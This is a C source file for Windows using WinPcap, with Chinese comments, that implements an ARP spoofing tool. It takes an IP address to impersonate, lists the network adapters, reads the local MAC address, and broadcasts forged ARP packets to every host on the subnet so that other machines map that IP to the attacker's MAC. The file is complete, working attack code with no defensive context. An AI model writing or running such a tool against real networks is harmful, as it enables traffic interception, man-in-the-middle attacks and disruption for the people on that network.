
#include <stdio.h>
#include <pcap.h>
#include <conio.h>
#include <packet32.h>
#include <ntddndis.h>
#include "ArpCheat.h"

int main(int argc,char* argv[]){
	pcap_if_t *alldevs;              //全部网卡列表
    pcap_if_t *d;                    //一个网卡
    int inum;                        //用户选择的网卡序号
    int i=0;                         //循环变量
    pcap_t *adhandle;                //一个pcap实例
    char errbuf[PCAP_ERRBUF_SIZE];   //错误缓冲区
	unsigned char *mac;              //本机MAC地址
	unsigned char *packet;           //ARP包
	unsigned long fakeIp;            //要伪装成的IP地址
	pcap_addr_t *pAddr;               //网卡地址
	unsigned long ip;                //IP地址
	unsigned long netmask;           //子网掩码

	if(argc!=2){
		printf("Usage: %s inet_addr\n",argv[0]);
		return -1;
	}

	//从参数列表获得要伪装的IP地址
	fakeIp = inet_addr(argv[1]);
	if(INADDR_NONE==fakeIp){
		fprintf(stderr,"Invalid IP: %s\n",argv[1]);
		return -1;
	}
    
    /* 获得本机网卡列表 */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    /* 打印网卡列表 */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d", ++i);
        if (d->description)
            printf(". %s\n", d->description);
        else
            printf(". No description available\n");
    }
    //如果没有发现网卡
    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }
    //请用户选择一个网卡
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);
    
	//如果用户选择的网卡序号超出有效范围，则退出
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

	

    
    /* 移动指针到用户选择的网卡 */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
    
    mac = GetSelfMac(d->name+8); //+8以去掉"rpcap://"

	printf("发送ARP欺骗包，本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) 试图伪装成%s\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],argv[1]);



	/* 打开网卡 */
    if ( (adhandle= pcap_open(d->name,          // name of the device
                              65536,            // portion of the packet to capture
                              0,                //open flag
                              1000,             // read timeout
                              NULL,             // authentication on the remote machine
                              errbuf            // error buffer
                              ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

	for(pAddr=d->addresses; pAddr; pAddr=pAddr->next){
		//得到用户选择的网卡的一个IP地址
		ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr;
		//得到该IP地址对应的子网掩码
		netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr;
		if (!ip || !netmask){
			continue;
		}
		//看看这个IP和要伪装的IP是否在同一个子网
		if((ip&netmask)!=(fakeIp&netmask)){
			continue; //如果不在一个子网，继续遍历地址列表
		}

		unsigned long netsize = ntohl(~netmask); //网络中主机数
		unsigned long net = ip & netmask; //子网地址
 
		for(unsigned long n=1; n<netsize; n++){
			//第i台主机的IP地址，网络字节顺序
            unsigned long destIp = net | htonl(n);
			//构建假的ARP响应包，达到本机伪装成给定的IP地址的目的
	        packet = BuildArpPacket(mac,fakeIp,destIp);
			if(pcap_sendpacket(adhandle, packet, 60)==-1){
				fprintf(stderr,"pcap_sendpacket error.\n");
			}
		}
	
	}

	return 0;
}
/**
* 获得网卡的MAC地址
* pDevName 网卡的设备名称
*/
unsigned char* GetSelfMac(char* pDevName){
	
	static u_char mac[6];
	
	memset(mac,0,sizeof(mac));
	
	LPADAPTER lpAdapter =   PacketOpenAdapter(pDevName);
	
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		return NULL;
	}

	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (OidData == NULL) 
	{
		PacketCloseAdapter(lpAdapter);
		return NULL;
	}
	// 
	// Retrieve the adapter MAC querying the NIC driver
	//
	OidData->Oid = OID_802_3_CURRENT_ADDRESS;

	OidData->Length = 6;
	memset(OidData->Data, 0, 6);
	
    BOOLEAN	Status = PacketRequest(lpAdapter, FALSE, OidData);
	if(Status)
	{
		memcpy(mac,(u_char*)(OidData->Data),6);
	}
	free(OidData);
	PacketCloseAdapter(lpAdapter);
	return mac;

}

/**
* 封装ARP请求包
* source_mac 源MAC地址
* srcIP 源IP
* destIP 目的IP
*/
unsigned char* BuildArpPacket(unsigned char* source_mac, unsigned long srcIP,unsigned long destIP)
{
	static struct arp_packet packet;
	
	//目的MAC地址为广播地址，FF-FF-FF-FF-FF-FF
	memset(packet.eth.dest_mac,0xFF,6);	
	//源MAC地址
	memcpy(packet.eth.source_mac,source_mac,6);
	//上层协议为ARP协议，0x0806
	packet.eth.eh_type = htons(0x0806);
	
	//硬件类型，Ethernet是0x0001
	packet.arp.hardware_type = htons(0x0001);
	//上层协议类型，IP为0x0800
	packet.arp.protocol_type = htons(0x0800);
	//硬件地址长度：MAC地址长度为0x06
	packet.arp.add_len = 0x06;
	//协议地址长度：IP地址长度为0x04
	packet.arp.pro_len = 0x04;
	//操作：ARP请求为1
	packet.arp.option = htons(0x0001);
	//源MAC地址
	memcpy(packet.arp.sour_addr,source_mac,6);
	//源IP地址
	packet.arp.sour_ip = srcIP;
	//目的MAC地址，填充0
	memset(packet.arp.dest_addr,0,6);
	//目的IP地址
	packet.arp.dest_ip = destIP;
	//填充数据，18B
	memset(packet.arp.padding,0,18);

	return (unsigned char*)&packet;

}